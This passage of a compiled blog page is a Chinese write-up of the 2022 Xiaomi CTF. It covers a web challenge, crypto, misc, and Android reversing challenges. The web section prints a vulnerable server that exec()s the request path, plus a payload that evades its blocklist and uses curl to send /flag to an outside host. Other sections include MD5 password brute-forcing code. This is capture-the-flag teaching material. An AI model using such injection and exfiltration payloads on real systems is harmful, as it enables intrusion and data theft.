address):\n        size = 1024\n        while True:\n            try:\n                data = client.recv(size)\n                if data:\n                    req = Request(data.decode())\n                    self.handleRequest(req, client, address)\n                    client.shutdown()\n                    client.close()\n                else:\n                    raise error(\'Client disconnected\')\n            except:\n                client.close()\n                return False\n\n    def handleRequest(self, request, conn, address):\n        if request.good:\n            document = self.serveDoc(request.doc, DOC_ROOT)\n            statusNum = document["status"]\n        else:\n            document = self.serveDoc("/errors/400.html", DOC_ROOT)\n            statusNum = "400"\n        body = document["body"]\n\n        statusCode = CODES[statusNum]\n        dateSent = ""\n        server = "SimpleHTTP/0.6 Python/3.8.2"\n        modified = ""\n        length = len(body)\n        contentType = document["mime"]\n        connectionType = "Closed"\n\n        resp = Response(\n            statusNum=statusNum, statusCode=statusCode,\n            dateSent=dateSent, server=server,\n            modified=modified, length=length,\n            contentType=contentType, connectionType=connectionType,\n            body=body\n        )\n\n        data = resp.stringResponse()\n        if not data:\n            return -1\n        conn.sendall(bytes("HTTP/1.1 200 OK\\r\\nServer: SimpleHTTP/0.6 Python/3.8\\r\\nConnection: Closed\\r\\n\\r\\n","utf-8"))\n        conn.sendall(body)\n        return 0\n\n    def waf(self,input):\n        blacklist = r"import|\\[|\\]|builtins\uFF5C\\|"\n        if re.search(blacklist,input,re.I|re.M):\n            print("Oh you are hacker! I can\'t allow your input.")\n            input = re.sub(blacklist,\'\',input)\n        return input\n\n    def serveDoc(self, path, docRoot):\n        path = urllib.parse.unquote(path)\n        try:\n            info = "output = \'Document: {}\'"\n            #print(self.waf(info.format(path)))\n            exec (self.waf(info.format(path)))\n            cwd = os.path.dirname(os.path.realpath(__file__))\n            docRoot = os.path.join(cwd, docRoot)\n            if path == "/":\n                path = "../index.html"\n            requested = os.path.join(docRoot, path[1:])\n            print(requested+str(os.path.isfile(requested)))\n            if os.path.isfile(requested):\n                mime = mimetypes.guess_type(requested)\n                mime = (mime if mime[0] != None else "text/html")\n                mime = MIMES[requested.split(".")[-1]]\n                try:\n                    with open(requested, "rb") as f:\n                        data = f.read()\n                except:\n                    with open(requested, "rb") as f:\n                        data = f.read()\n                status = "200"\n            else:\n                errorPage = os.path.join(docRoot, "errors", "404.html")\n                print(errorPage)\n                mime = "text/html"\n                with open(errorPage, "rb") as f:\n                    data = f.read()\n                status = "404"\n        except Exception as e:\n            #print(e)\n            errorPage = os.path.join(docRoot, "errors", "500.html")\n            mime = "text/html"\n            with open(errorPage, "rb") as f:\n                data = f.read()\n            status = "500"\n        return {"body": data, "mime": mime, "status": status}\n\nif __name__ == \'__main__\':\n    Server("0.0.0.0",7777).listen()\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u5173\u952E\u70B9\u5728exec\u90A3\u53E5\u8BDD\uFF0C\u7A0B\u5E8F\u4F1A\u5C06path\u653E\u5728exec\u547D\u4EE4\u4E2D\u6267\u884C\uFF0C\u6211\u4EEC\u5C31\u9700\u8981\u6784\u9020path\uFF0C\u7ED5\u8FC7waf\u5BF9import\u3001\u65B9\u62EC\u53F7\u3001builtins\u548C\u7AD6\u7EBF\u7684\u8FC7\u6EE4\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-text",meta:"",children:"http://10.38.202.214:7777/'+str(eval('__im'+'port__(\"os\").system(\"curl http://10.167.90.69:1337/hello/$(cat /flag | base64)\")'))+'\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u901A\u8FC7\u5B57\u7B26\u4E32\u8FDE\u63A5\u5C06import\u9694\u5F00\uFF0C\u901A\u8FC7\u8BBF\u95EE\u8FDC\u7A0B\u8DEF\u5F84\u7684\u65B9\u5F0F\uFF0C\u5C06\u4FE1\u606F\u4F20\u8F93\u51FA\u53BB\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u76EE\u53EF\u4EE5\u5728\u672C\u5730\u8D77\u670D\u52A1\uFF0C\u6162\u6162\u8C03\u8BD5\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"embedded-1-\u8EB2\u732B\u732B",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#embedded-1-\u8EB2\u732B\u732B",children:"#"}),"embedded-1 \u8EB2\u732B\u732B"]}),"\n",(0,t.jsx)(n.p,{children:"\u6587\u4EF6\u6253\u5F00\uFF0C\u5728\u6700\u540E\u53D1\u73B0\u4E86flag\u4FE1\u606F\uFF0C\u8FD9\u4E24\u5757\u7684****\u7684\u5185\u5BB9\u53EF\u4EE5\u76F8\u4E92\u8865\u5145\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u76F4\u63A5\u627E",src:j})}),"\n",(0,t.jsxs)(n.h2,{id:"crypto-1-\u4E71\u7801\u4E2D\u7684\u5965\u5999",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#crypto-1-\u4E71\u7801\u4E2D\u7684\u5965\u5999",children:"#"}),"crypto-1 \u4E71\u7801\u4E2D\u7684\u5965\u5999"]}),"\n",(0,t.jsx)(n.p,{children:"\u7ED9\u4E86\u4E09\u4E2A\u6587\u4EF6\uFF0C\u52A0\u5BC6\u6587\u672C\u3001\u5BC6\u7801\u5217\u8868\u548C\u4E00\u4E2A\u52A0\u5BC6\u89E3\u5BC6\u7B97\u6CD5\u3002\u5199\u4E2A\u7A0B\u5E8F\u7528\u5BC6\u7801\u5217\u8868\u4E2D\u7684\u5BC6\u7801\u4F9D\u6B21\u89E3\u5BC6\u52A0\u5BC6\u6587\u672C\uFF0C\u627E\u5230\u4EE5fl\u5F00\u5934\u7684\u89E3\u5BC6\u7ED3\u679C\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",meta:"",children:'package com.sumygg.mictf2022.crypto_1;\n\nimport java.io.*;\nimport java.nio.file.Files;\nimport java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) throws IOException {\n        File passwordFile = new File("src/main/java/com/sumygg/mictf2022/crypto_1/passwords.passwords");\n        File cipherTextFile = new File("src/main/java/com/sumygg/mictf2022/crypto_1/cipherText.txt");\n\n        Scanner cipherTextScanner = new Scanner(Files.newInputStream(cipherTextFile.toPath()));\n        String cipherText = cipherTextScanner.nextLine();\n\n        System.out.println("cipherText = " + cipherText);\n\n        Scanner passwordScanner = new Scanner(Files.newInputStream(passwordFile.toPath()));\n        while (passwordScanner.hasNext()) {\n            String passwd = passwordScanner.nextLine();\n            String decode = R96Crypto.encdec(R96Crypto.DEC, passwd, cipherText);\n            if (decode.startsWith("fl")) {\n                System.out.println(passwd + " " + decode);\n            }\n        }\n    }\n\n}\n'})}),"\n",(0,t.jsxs)(n.h2,{id:"misc-1-\u56FE\u7247\u4E2D\u7684\u79D8\u5BC6",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#misc-1-\u56FE\u7247\u4E2D\u7684\u79D8\u5BC6",children:"#"}),"misc-1 \u56FE\u7247\u4E2D\u7684\u79D8\u5BC6"]}),"\n",(0,t.jsx)(n.p,{children:"\u4E0D\u89E3\u91CA"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u53C8\u662F\u76F4\u63A5\u627E",src:w})}),"\n",(0,t.jsxs)(n.h2,{id:"misc-2-\u5F31\u5BC6\u7801\u4E0D\u53EF\u6709",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#misc-2-\u5F31\u5BC6\u7801\u4E0D\u53EF\u6709",children:"#"}),"misc-2 \u5F31\u5BC6\u7801\u4E0D\u53EF\u6709\uFF01"]}),"\n",(0,t.jsx)(n.p,{children:"\u6839\u636E\u63CF\u8FF0\u6784\u9020\u7206\u7834\u5BC6\u7801"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"14\u4F4D\u82F1\u6587\u548C\u6570\u5B57"}),"\n",(0,t.jsx)(n.li,{children:"00\u540E\uFF0C\u5305\u542B\u751F\u65E5"}),"\n",(0,t.jsx)(n.li,{children:"\u7B2C\u4E00\u4F4D\u505A\u4E86\u4FEE\u6539\uFF08\u5E94\u8BE5\u662F\u5C0F\u5199\u6539\u5927\u5199\uFF09"}),"\n",(0,t.jsx)(n.li,{children:"\u6700\u540E\u4E00\u4F4D\u52A0\u4E861\u4E2A\u7B26\u53F7"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"\u53EA\u6709\u8FD9\u4E9B\u4FE1\u606F\u7834\u89E3\u8D77\u6765\u6709\u70B9\u9EBB\u70E6\uFF0C\u8FD8\u9700\u8981\u5408\u7406\u731C\u6D4B\uFF0C\u6BD4\u5982\u5F00\u5934\u662Fxiaomi\uFF0C\u8FD9\u6837\u6B63\u597D6\u82F1\u6587+8\u6570\u5B57=14\u4F4D\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u5269\u4E0B\u7684\u5C31\u662F\u7834\u89E3\u751F\u65E5\u548C\u7279\u6B8A\u7B26\u53F7\u4E86\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",meta:"",children:"import hashlib\nimport datetime\n\ntarget = 'a1c6eaee90a012a1bb054bddcd081d6a'\n\nadditional_chars = '~!@#$%^&*()[{]}-_=+|;:\\'\",<.>/?`'\nuppercase_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nlowercase_letters = 'abcdefghijklmnopqrstuvwxyz'\n\nfirst_date = datetime.date(2000, 1, 1)\n\ncnt = 0\n\n\ndef dfs(is_first: bool, is_end: bool, has_birth: bool, pass_str: str):\n    # \u5DF2\u7ECF\u62FC\u63A5\u597D\uFF0C\u8BA1\u7B97md5\u6BD4\u5BF9\n    if is_end:\n        global cnt\n        cnt = cnt + 1\n        hl = hashlib.md5()\n        hl.update(pass_str.encode(encoding='utf-8'))\n        # print(pass_str + \" \" + hl.hexdigest())\n        if hl.hexdigest() == target:\n            print(\"found \" + pass_str)\n        if cnt % 1000000 == 0:\n            print(cnt)\n        return\n\n    # 14\u4F4D\uFF0C\u8865\u5145\u7279\u6B8A\u7B26\u53F7\n    if len(pass_str) == 14:\n        for ch in additional_chars:\n            dfs(is_first, True, has_birth, pass_str + ch)\n        return\n\n    # \u62FC\u63A5\u7B2C\u4E00\u4F4D\n    if is_first:\n        for ch in uppercase_letters:\n            dfs(False, is_end, has_birth, ch)\n        return\n\n    # \u62FC\u63A5\u666E\u901A\u5B57\u6BCD\n    if len(pass_str) < 6:\n        for ch in lowercase_letters:\n            dfs(is_first, is_end, has_birth, pass_str + ch)\n\n    # \u62FC\u63A5\u751F\u65E5\u5B57\u7B26\u4E32\n    elif not has_birth:\n        for d in range(0, 365 * 5):\n            date_str = (first_date + datetime.timedelta(d)).strftime(\"%Y%m%d\")\n            dfs(is_first, is_end, True, pass_str + date_str)\n\n    return\n\n\ndfs(False, False, False, 'Xiaomi')\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u627E\u5230\u4E86 ",(0,t.jsx)(n.code,{children:"Xiaomi20020604@"})]}),"\n",(0,t.jsx)(n.p,{children:"\u7528\u4E0A\u9762\u7684\u5BC6\u7801\u89E3\u538B\u5B8C\u7ED9\u51FA\u7684flag.zip\uFF0C\u627E\u5230\u4E00\u4E2Aword\u6587\u4EF6\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u4E70\u7684\u6B63\u7248\u7684Office\u7684\u552F\u4E00\u7528\u9014",src:_})}),"\n",(0,t.jsxs)(n.p,{children:["\u770B\u683C\u5F0F\u662F\u4E00\u79CD\u53EBook\u7684\u8BED\u8A00\uFF0C\u6709\u4E2A\u5728\u7EBF\u89E3\u7801\u5668 ",(0,t.jsx)(n.a,{href:"https://www.splitbrain.org/services/ook",target:"_blank",rel:"noopener noreferrer",children:"https://www.splitbrain.org/services/ook"})]}),"\n",(0,t.jsx)(n.p,{children:"\u4F46\u662F\u6587\u672C\u89E3\u51FA\u6765\u7684\u53EA\u6709flag\u7684\u524D\u534A\u90E8\u5206\uFF0C\u540E\u534A\u90E8\u5206\u53BB\u54EA\u513F\u4E86\uFF1F\u539F\u6765\u85CF\u5728\u7684work\u6587\u4EF6\u6700\u540E\uFF0C\u8BE5\u4E2A\u989C\u8272\u5C31\u51FA\u6765\u4E86\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u8BA9\u6211\u60F3\u8D77\u4E86\u8BBA\u6587\u51D1\u5B57\u6570",src:y})}),"\n",(0,t.jsx)(n.p,{children:"\u5C06\u4E24\u90E8\u5206\u5408\u5E76\uFF0C\u5F97\u5230\u5B8C\u6574\u7684flag\u3002"}),"\n",(0,t.jsxs)(n.h2,{id:"android-1-\u6293token",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#android-1-\u6293token",children:"#"}),"android-1 \u6293token"]}),"\n",(0,t.jsx)(n.p,{children:"\u7528jd-gui\u53CD\u7F16\u8BD1smali\u4EE3\u7801\u8F6C\u6210java\u4F2A\u4EE3\u7801\uFF0C\u53D1\u73B0\u5927\u6982\u7B97\u6CD5\u662F\u6BCF\u4E24\u4E2A\u5B57\u7B26\u7ECF\u8FC7\u8FD0\u7B97\u51FA\u4E00\u4E2Ahash\uFF0C\u548C\u76EE\u6807\u6570\u7EC4\u91CC\u7684hash\u503C\u6BD4\u8F83\u662F\u5426\u4E00\u81F4\u3002"}),"\n",(0,t.jsx)(n.p,{children:"\u5C06\u903B\u8F91\u63D0\u53D6\u51FA\u6765\uFF0C\u7528\u7A0B\u5E8F\u641C\u7D22\u4E00\u4E0B\uFF1A"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",meta:"",children:"package com.sumygg.mictf2022.android_1;\n\npublic class CatchToken2 {\n    private static final int[] target = new int[]{\n            -912680206, 2031609106, -815368373, 1069350675, -1370062066, -1772356947, -987972278, 96827298, 1685607320, 1067167222,\n            -2063214181, 1081770804, -1341224450, 1264237829, -617750188, 1934300439};\n\n    private static String searchToken(Integer target) {\n        for (char ch1 = ' '; ch1 <= '~'; ch1++) {\n            for (char ch2 = ' '; ch2 <= '~'; ch2++) {\n                int j = ((ch2 & 0xFF) << 8 | ch1 & 0xFF) * -862048943;\n                j = (j << 15 | j >>> 17) * 461845907 ^ 0x64 ^ 0x2;\n                j = (j ^ j >>> 16) * -2048144789;\n                j = (j ^ j >>> 13) * -1028477387;\n                int res = j ^ j >>> 16;\n                if (res == target) {\n                    return \"\" + ch1 + ch2;\n                }\n            }\n        }\n        return \"++NOT FOUND++\";\n    }\n\n    public static void main(String[] args) {\n        for (int tar : target) {\n            System.out.print(searchToken(tar));\n        }\n        System.out.println();\n    }\n}\n"})}),"\n",(0,t.jsxs)(n.h2,{id:"android-2-easy-android",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#android-2-easy-android",children:"#"}),"android-2 easy android"]}),"\n",(0,t.jsx)(n.p,{children:"so\u6587\u4EF6\u53CD\u7F16\u8BD1\uFF0C\u6254\u5230IDA pro\u91CC\uFF0CF5\u8F6C\u6362\u6210\u4F2A\u4EE3\u7801"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"IDA pro YYDS",src:k})}),"\n",(0,t.jsx)(n.p,{children:"\u5927\u6982\u610F\u601D\u662F\uFF0C\u5C06key\u548Cseed\u8FD0\u7B97\u751F\u6210\u4E00\u4E2A\u6570\u7EC4\uFF0C\u4F5C\u4E3A\u5BC6\u94A5\u3002\u7528\u8F93\u5165\u7684\u5B57\u7B26\u4E32\u548C\u5BC6\u94A5\u8FDB\u884CAES/128/ECB/noPadding\u8FDB\u884C\u52A0\u5BC6\uFF0C\u52A0\u5BC6\u751F\u6210\u7684\u5B57\u7B26\u4E32\u4E0EmaskData\u6BD4\u8F83\uFF0C\u5224\u65AD\u8F93\u5165\u5B57\u7B26\u4E32\u662F\u5426\u6B63\u786E\u3002"}),"\n",(0,t.jsx)(n.p,{children:"maskData\u7684\u503C"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"maskData",src:S})}),"\n",(0,t.jsx)(n.p,{children:"\u5199\u4E2A\u7A0B\u5E8F\u53CD\u5411\u89E3\u5BC6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",meta:"",children:"from Crypto.Cipher import AES\n\nseed = 0x6b\nmaskData = [0x75, 0x5d, 0xf2, 0x5c, 0xd2, 0x38, 0x29, 0x89, 0x81,\n            0x6f, 0xa7, 0x4d, 0xca, 0x51, 0x86, 0x70, 0x33, 0x97,\n            0xa0, 0x4f, 0xff, 0xba, 0xce, 0x8f, 0x4d, 0x6f, 0xc4,\n            0x34, 0xb0, 0x12, 0xdf, 0xe1]\nkey = [ord(e) for e in \"JustThisKeyHere!\"]\ndata = [ord(e) for e in \"1111111111111111\"]\ndata[0] = seed ^ key[0]\ndata[1] = seed ^ key[0] ^ key[1]\ndata[2] = data[1] ^ key[2]\ndata[3] = data[1] ^ key[2] ^ key[3]\ndata[4] = data[3] ^ key[4]\ndata[5] = data[3] ^ key[4] ^ key[5]\ndata[6] = data[5] ^ key[6]\ndata[7] = data[5] ^ key[6] ^ key[7]\ndata[8] = data[7] ^ key[8]\ndata[9] = data[7] ^ key[8] ^ key[9]\ndata[10] = data[9] ^ key[10]\ndata[11] = data[9] ^ key[10] ^ key[11]\ndata[12] = data[11] ^ key[12]\ndata[13] = data[11] ^ key[12] ^ key[13]\ndata[14] = data[13] ^ key[14]\ndata[15] = data[13] ^ key[14] ^ key[15]\nprint(data)\n\ncryptor = AES.new(b''.join(map(lambda x: int.to_bytes(x, 1, 'little'), data)), AES.MODE_ECB)\norigin_data = cryptor.decrypt(b''.join(map(lambda x: int.to_bytes(x, 1, 'big'), maskData)))\nprint(origin_data)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6700\u540E\u89E3\u5BC6\u51FA\u6765\u7684\u503C\u548Cflag{}\u62FC\u63A5\u751F\u6210\u6700\u540E\u7684flag\uFF08\u4E0D\u50CFflag\u7684flag\uFF09"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-text",meta:"",children:"flag{S-NGN*9}}:3cy%%>X,ELRlG1w*Zx[?-+}\n"})}),"\n",(0,t.jsxs)(n.h2,{id:"android-3-\u6765\u62BD\u5956\u5427",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#android-3-\u6765\u62BD\u5956\u5427",children:"#"}),"android-3 \u6765\u62BD\u5956\u5427"]}),"\n",(0,t.jsx)(n.p,{children:"\u53CD\u7F16\u8BD1\u540E\u6838\u5FC3\u903B\u8F91\u5728\u4E8E\u53F7\u7801\u7684\u8BA1\u7B97\u6210\u5151\u5956\u51ED\u8BC1\u7684\u4E00\u6BB5\u3002\u5C06\u6838\u5FC3\u903B\u8F91\u63D0\u53D6\u51FA\u6765\uFF0C\u8BA1\u7B97\u4E00\u4E0B\u3002"}),"\n",(0,t.jsx)(n.p,{children:"DataHolder.java"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",meta:"",children:"package com.sumygg.mictf2022.android_3;\n\npublic class DataHolder {\n    public static long[] a = new long[5];\n\n    public static long[] b = new long[5];\n\n    public static boolean[] c = new boolean[5];\n}\n"})}),"\n",(0,t.jsx)(n.p,{children:"b.java"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",meta:"",children:"package com.sumygg.mictf2022.android_3;\n\npublic class b implements Runnable {\n    public Thread a;\n\n    public String b;\n\n    public int c = 0;\n\n    public int d = 1000;\n\n    public long e = 0L;\n\n    public long f = 0L;\n\n    public b(int paramInt, long paramLong1, long paramLong2) {\n        this.b = Integer.toString(paramInt);\n        this.c = paramInt;\n        DataHolder.a[paramInt] = 0L;\n        DataHolder.b[paramInt] = 0L;\n        DataHolder.c[paramInt] = false;\n        this.e = paramLong1;\n        this.f = paramLong2;\n    }\n\n    public void a() {\n        if (this.a == null) {\n            Thread thread = new Thread(this, this.b);\n            this.a = thread;\n            thread.start();\n        }\n    }\n\n    public void run() {\n        try {\n            while (true) {\n                int i = this.d;\n                if (i != 0) {\n                    long l = (1103515245L * this.f + 12345L) % 2147483648L;\n                    this.f = l;\n                    l %= 10L;\n                    if (l == this.e)\n                        this.d = i - 1;\n                    long[] arrayOfLong = DataHolder.b;\n                    i = this.c;\n                    arrayOfLong[i] = l;\n                    arrayOfLong = DataHolder.a;\n                    arrayOfLong[i] = arrayOfLong[i] + 1L;\n                    Thread.sleep(0L);\n                    continue;\n                }\n                DataHolder.c[this.c] = true;\n                return;\n            }\n        } catch (InterruptedException interruptedException) {\n        }\n    }\n}\n"})}),"\n",(0,t.jsx)(n.p,{children:"Awards.java"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",meta:"",children:"package com.sumygg.mictf2022.android_3;\n\nimport java.util.Arrays;\n\npublic class Awards {\n    public static void main(String[] args) throws InterruptedException {\n//        int[] award = new int[]{2, 3, 4, 5, 6};\n        int[] award = new int[]{4, 1, 7, 6, 9};\n\n        b b5 = new b(0, award[0], 123456L);\n        b b3 = new b(1, award[1], 562L);\n        b b1 = new b(2, award[2], 88962L);\n        b b6 = new b(3, award[3], 98745123L);\n        b b4 = new b(4, award[4], 2551024833L);\n\n        b5.a();\n        b3.a();\n        b1.a();\n        b6.a();\n        b4.a();\n\n        b1.a.join();\n        b3.a.join();\n        b4.a.join();\n        b5.a.join();\n        b6.a.join();\n\n        System.out.println(Arrays.toString(DataHolder.a));\n        System.out.println(Arrays.toString(DataHolder.b));\n    }\n}\n"})}),"\n",(0,t.jsxs)(n.h2,{id:"android-4-click_the_button",children:[(0,t.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#android-4-click_the_button",children:"#"}),"android-4 click_the_button"]}),"\n",(0,t.jsx)(n.p,{children:"\u53CD\u7F16\u8BD1\uFF0C\u53D1\u73B0\u8FD9\u4E2A\u9898\u8981\u70B910000\u6B21\u6309\u94AE\u624D\u4F1A\u6709\u7ED3\u679C\uFF0C\u5C06\u6838\u5FC3\u903B\u8F91\u63D0\u53D6\u51FA\u6765\uFF0C\u91CD\u590D10000\u6B21\uFF0C\u83B7\u53D6\u7684\u5B57\u7B26\u4E32\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",meta:"",children:'package com.sumygg.mictf2022.android_5;\n\npublic class ClickTheButton {\n    public static int n = 0;\n    public static int[] o = new int[]{0, 0, 0, 0, 0, 0, 0, 0};\n    public static int[] p = new int[]{-1697858774, 1295603483, -1212291049, 1669685709, 1997247066, -1187674524, -1142408073, 1618842764};\n\n    private static String concat(String a, String b) {\n        return a + b;\n    }\n\n    public static void onClick() {\n        String str;\n        int k = n;\n        if (k > 10000)\n            return;\n        int i = 0;\n        int j = 0;\n        if (k == 10000) {\n            for (i = 0; i < 8; i++) {\n                int[] arrayOfInt1 = o;\n                k = arrayOfInt1[i];\n                arrayOfInt1[i] = p[i] ^ k;\n            }\n            int[] arrayOfInt = o;\n            StringBuilder stringBuilder = new StringBuilder();\n            k = arrayOfInt.length;\n            for (i = j; i < k; i++) {\n                String str2 = Integer.toHexString(arrayOfInt[i]);\n                String str1 = str2;\n                if (str2.length() == 1)\n                    str1 = concat("0", str2);\n                stringBuilder.append(str1);\n            }\n            str = stringBuilder.toString();\n            System.out.println(str);\n        } else {\n            int m = k % 8;\n            int[] arrayOfInt = o;\n            j = arrayOfInt[m];\n            byte[] arrayOfByte = new byte[4];\n            arrayOfByte[0] = (byte) (j >> 24 & 0xFF);\n            arrayOfByte[1] = (byte) (j >> 16 & 0xFF);\n            arrayOfByte[2] = (byte) (j >> 8 & 0xFF);\n            arrayOfByte[3] = (byte) (j & 0xFF);\n            j = k;\n            while (i < 4) {\n                k = (arrayOfByte[i] & 0xFF | (arrayOfByte[i + 1] & 0xFF) << 8 | (arrayOfByte[i + 2] & 0xFF) << 16 | arrayOfByte[i + 3] << 24) * -862048943;\n                j ^= (k << 15 | k >>> 17) * 461845907;\n                j = (j >>> 19 | j << 13) * 5 - 430675100;\n                i += 4;\n            }\n            i = j ^ 0x4;\n            i = (i ^ i >>> 16) * -2048144789;\n            i = (i ^ i >>> 13) * -1028477387;\n            arrayOfInt[m] = i ^ i >>> 16;\n        }\n        n++;\n    }\n\n    public static void main(String[] args) {\n        for (int i = 0; i <= 10000; i++) {\n            onClick();\n        }\n    }\n\n}\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u4F46\u5F97\u5230\u7684\u4E0D\u662F\u6700\u7EC8\u7684flag\uFF0C\u800C\u662F\u4E00\u4E32\u5B57\u7B26\u4E32\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-text",meta:"",children:"54576b365a6d78685a3374456231394f62315266596d566652585a7054434639\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5148\u7528\u5341\u516D\u8FDB\u5236\u89E3\u7801\uFF0C\u53C8\u5F97\u5230\u4E00\u4E2A\u5B57\u7B26\u4E32\uFF0C\u8FD8\u4E0D\u662Fflag\u3002"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-text",meta:"",children:"TWk6ZmxhZ3tEb19Ob1RfYmVfRXZpTCF9\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u4F7F\u7528\u7F51\u7AD9\uFF0C ",(0,t.jsx)(n.a,{href:"https://www.dcode.fr/cipher-identifier",target:"_blank",rel:"noopener noreferrer",children:"https://www.dcode.fr/cipher-identifier"})," \uFF0C\u731C\u6D4B\u4E00\u4E0B\u662F\u54EA\u79CD\u52A0\u5BC6\u65B9\u5F0F\uFF0C\u6328\u4E2A\u5C1D\u8BD5\u3002\u6700\u7EC8\u53D1\u73B0\u662Fbase64\u7F16\u7801"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.a,{href:"https://www.dcode.fr/base-64-encoding",target:"_blank",rel:"noopener noreferrer",children:"https://www.dcode.fr/base-64-encoding"})}),"\n",(0,t.jsx)(n.p,{children:"\u89E3\u7801\u83B7\u5F97flag\u3002"})]})}function v(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},{wrapper:n}=Object.assign({},(0,r.useMDXComponents)(),e.components);return n?(0,t.jsx)(n,Object.assign({},e,{children:(0,t.jsx)(T,e)})):T(e)}n.default=v,v.__RSPRESS_PAGE_META={},v.__RSPRESS_PAGE_META["..%2Fsource%2F_posts%2F2022-06-24-mi-ctf-writeup%2F2022-06-24-mi-ctf-writeup.md"]={toc:[{id:"re-1-maze",text:"re-1 maze",depth:2},{id:"web-1-\u7B7E\u5230\u9898",text:"web-1 \u7B7E\u5230\u9898",depth:2},{id:"web-2-\u4F60\u4F1A\u6293\u5305\u5417",text:"web-2 \u4F60\u4F1A\u6293\u5305\u5417",depth:2},{id:"web-3-\u7206\u7834\u5F31\u53E3\u4EE4",text:"web-3 \u7206\u7834\u5F31\u53E3\u4EE4",depth:2},{id:"web-4-\u624B\u901F\u8981\u5FEB",text:"web-4 \u624B\u901F\u8981\u5FEB",depth:2},{id:"web-5-actuator\u914D\u7F6E\u4E0D\u5F53\u4F1A\u53D1\u751F\u4EC0\u4E48\u5462",text:"web-5 Actuator\u914D\u7F6E\u4E0D\u5F53\u4F1A\u53D1\u751F\u4EC0\u4E48\u5462",depth:2},{id:"web-6-\u63A5\u53E3\u6587\u6863\u5728\u54EA\u513F\u5462",text:"web-6 \u63A5\u53E3\u6587\u6863\u5728\u54EA\u513F\u5462",depth:2},{id:"web-7-\u7834\u89E3uid",text:"web-7 \u7834\u89E3uid",depth:2},{id:"web-8-\u542C\u8BF4\u4F60\u4E5F\u4E86\u89E3http",text:"web-8 \u542C\u8BF4\u4F60\u4E5F\u4E86\u89E3HTTP",depth:2},{id:"web-9-\u88AB\u6E05\u7A7A\u7684\u6587\u4EF6",text:"web-9 \u88AB\u6E05\u7A7A\u7684\u6587\u4EF6",depth:2},{id:"web-10-\u4E00\u4E2A\u5B89\u5168\u914D\u7F6E\u5F15\u53D1\u7684\u8840\u6848",text:"web-10 \u4E00\u4E2A\u5B89\u5168\u914D\u7F6E\u5F15\u53D1\u7684\u8840\u6848",depth:2},{id:"web-11-\u5C31\u4E00\u4E2A\u4E0A\u4F20\u64CD\u4F5C\u80FD\u6709\u5565\u95EE\u9898",text:"web-11 \u5C31\u4E00\u4E2A\u4E0A\u4F20\u64CD\u4F5C\u80FD\u6709\u5565\u95EE\u9898",depth:2},{id:"web-12-\u53EA\u6709\u672C\u4EBA\u624D\u80FD\u67E5\u770B\u54E6",text:"web-12 \u53EA\u6709\u672C\u4EBA\u624D\u80FD\u67E5\u770B\u54E6",depth:2},{id:"web-13-\u5199\u4E2Aphpinfo\u80FD\u6709\u591A\u5927\u98CE\u9669",text:"web-13 \u5199\u4E2Aphpinfo\u80FD\u6709\u591A\u5927\u98CE\u9669",depth:2},{id:"web-15-\u9B54\u6CD5\u7684\u529B\u91CF",text:"web-15 \u9B54\u6CD5\u7684\u529B\u91CF",depth:2},{id:"web-16-\u4F60\u542C\u8BF4\u8FC7thinkphp\u5417",text:"web-16 \u4F60\u542C\u8BF4\u8FC7Thinkphp\u5417",depth:2},{id:"web-17-\u7B80\u964B\u7684\u7559\u8A00\u677F",text:"web-17 \u7B80\u964B\u7684\u7559\u8A00\u677F",depth:2},{id:"web-18-\u6781\u7B80\u7684spring",text:"web-18 